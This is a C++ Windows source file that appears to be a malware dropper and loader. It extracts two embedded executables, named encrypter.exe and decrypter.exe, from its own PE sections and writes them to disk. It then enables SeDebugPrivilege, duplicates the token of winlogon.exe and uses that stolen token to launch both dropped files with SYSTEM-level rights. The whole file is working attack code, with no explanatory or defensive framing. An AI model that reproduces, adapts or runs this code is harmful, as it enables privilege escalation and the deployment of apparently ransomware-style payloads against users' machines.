#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
//#include <psapi.h>


bool write_crypter() {
	HANDLE handle = NULL, file = NULL;
	MODULEENTRY32 me;
	LPVOID base = NULL, write_file = NULL;
	IMAGE_DOS_HEADER dos = { 0 };
	IMAGE_NT_HEADERS nt = { 0 };
	DWORD ret = 0;

	while (1) {
		handle = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
		if (handle == INVALID_HANDLE_VALUE) {
			if (ERROR_BAD_LENGTH == GetLastError()) continue;
			else {
				puts("Unkown error\n");
				return false;
			}
		}
		else break;
	}

	me.dwSize = sizeof(MODULEENTRY32);

	if (!Module32First(handle, &me)) {
		printf("Module32First failed %lu\n", GetLastError());
		return false;
	}
	base = me.modBaseAddr;
	CloseHandle(handle);

	if (!ReadProcessMemory(GetCurrentProcess(), base, &dos, sizeof(IMAGE_DOS_HEADER), 0)) {
		puts("ReadProcessMemory failed\n");
		return false;
	}
	if (dos.e_magic != IMAGE_DOS_SIGNATURE) {
		puts("inavlid PE\n");
		return false;
	}
	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((PBYTE)base + dos.e_lfanew), &nt, sizeof(IMAGE_NT_HEADERS), 0)) {
		puts("ReadProcessMemory failed\n");
		return false;
	}
	if (nt.Signature != IMAGE_NT_SIGNATURE) {
		puts("not valid nt signature\n");
		return false;
	}

	PIMAGE_SECTION_HEADER crypt = new IMAGE_SECTION_HEADER[nt.FileHeader.NumberOfSections];


	if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)((PBYTE)base + dos.e_lfanew + sizeof(IMAGE_NT_HEADERS)), crypt, sizeof(IMAGE_SECTION_HEADER) * nt.FileHeader.NumberOfSections, 0)) {
		puts("ReadProcessMemory failed\n");
		return false;
	}


	int i = 0;
	for (i = nt.FileHeader.NumberOfSections - 1; i >= 0; --i) {
		if (memcmp(crypt[i].Name, "encrypt", 7) == 0) break;
	}

	if (i > -1) {
		write_file = HeapAlloc(GetProcessHeap(), 0, crypt[i].Misc.VirtualSize);
		if (write_file == NULL) {
			puts("write_file allocation failed\n");
			return false;
		}
		memcpy(write_file, (LPVOID)((DWORD)base + crypt[i].VirtualAddress), crypt[i].Misc.VirtualSize);
		file = CreateFileA("encrypter.exe", GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("encrypter.exe creation failed %lu\n", GetLastError());
			return false;
		}
		if (!WriteFile(file, write_file, crypt[i].Misc.VirtualSize, &ret, NULL)) {
			printf("WriteFile failed %lu", GetLastError());
			return false;
		}
		CloseHandle(file);
	}
	else {
		puts("could not find encrypt section\n");
		return false;
	}
	for (i = nt.FileHeader.NumberOfSections - 1; i >= 0; --i) {
		if (memcmp(crypt[i].Name, "decrypt", 7) == 0) break;
	}
	if (i > -1) {
		write_file = HeapAlloc(GetProcessHeap(), 0, crypt[i].Misc.VirtualSize);
		if (write_file == NULL) {
			puts("write_file allocation failed\n");
			return false;
		}
		memcpy(write_file, (LPVOID)((DWORD)base + crypt[i].VirtualAddress), crypt[i].Misc.VirtualSize);
		file = CreateFileA("decrypter.exe", GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("decrypter.exe creation failed %lu\n", GetLastError());
			return false;
		}
		if (!WriteFile(file, write_file, crypt[i].Misc.VirtualSize, &ret, NULL)) {
			printf("WriteFile failed %lu", GetLastError());
			return false;
		}
		CloseHandle(file);
	}
	else {
		puts("could not find decrypt section\n");
		return false;
	}
	return true;
}

int main(int argc, char* argv[]) {
	HANDLE hToken, ntoken, rprocess;
	LUID sedebugnameValue{};
	TOKEN_PRIVILEGES tkp;
	PRIVILEGE_SET privs;
	BOOL result;

	if (write_crypter() == false) {
		puts("failed to write encrypter\n");
		return false;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
		printf("OpenProcessToken() failed, Error = %d SeDebugPrivilege is not available.\n", GetLastError());
		return false;
	}

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {
		printf("LookupPrivilegeValue() failed, Error = %d SeDebugPrivilege is not available.\n", GetLastError());
		CloseHandle(hToken);
		return false;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = sedebugnameValue;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
		printf("AdjustTokenPrivileges() failed, Error = %d SeDebugPrivilege is not available.\n", GetLastError());

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken)) {
		printf("OpenProcessToken() failed, Error = %d SeDebugPrivilege is not available.\n", GetLastError());
		return false;
	}
	PrivilegeCheck(hToken, &privs, &result);
	if (result == false) {
		printf("we dont have debug privilege.\n");
	}
	CloseHandle(hToken);

	DWORD win_proc_id = 0;

	PROCESSENTRY32 proc_info;
	proc_info.dwSize = sizeof(proc_info);
	HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	Process32First(proc_snap, &proc_info);

	while (1) {
		if (memcmp(proc_info.szExeFile, "winlogon.exe", 12) == 0) {
			win_proc_id = proc_info.th32ProcessID;
			break;
		}
		if (Process32Next(proc_snap, &proc_info) == 0) break;
	}

	CloseHandle(proc_snap);

	rprocess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, win_proc_id);
	if (rprocess == NULL) {
		printf("OpenProcess WinLogon Failed.\n");
	}
	else {
		if (OpenProcessToken(rprocess, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken) == false) {
			printf("openProcessToken Failed.\n");
		}
		else {
			if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &ntoken) == false) {//TokenPrimary ,TokenImpersonation
				printf("DuplicateTokenEx failed %lu.\n", GetLastError());
			}
			else {
				STARTUPINFOW si = {};
				PROCESS_INFORMATION pi = {};
				if (CreateProcessWithTokenW(ntoken, LOGON_WITH_PROFILE, L"encrypter.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) == false) {
					printf("CreateProcessWithTokenW failed. %lu\n", GetLastError());
				}
				WaitForSingleObject(pi.hProcess, INFINITE);
			}
			if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &ntoken) == false) {//TokenPrimary ,TokenImpersonation
				printf("DuplicateTokenEx failed %lu.\n", GetLastError());
			}
			else {
				STARTUPINFOW si = {};
				PROCESS_INFORMATION pi = {};
				if (CreateProcessWithTokenW(ntoken, LOGON_WITH_PROFILE, L"decrypter.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) == false) {
					printf("CreateProcessWithTokenW failed. %lu\n", GetLastError());
				}
			}
		}
	}
	return 0;
}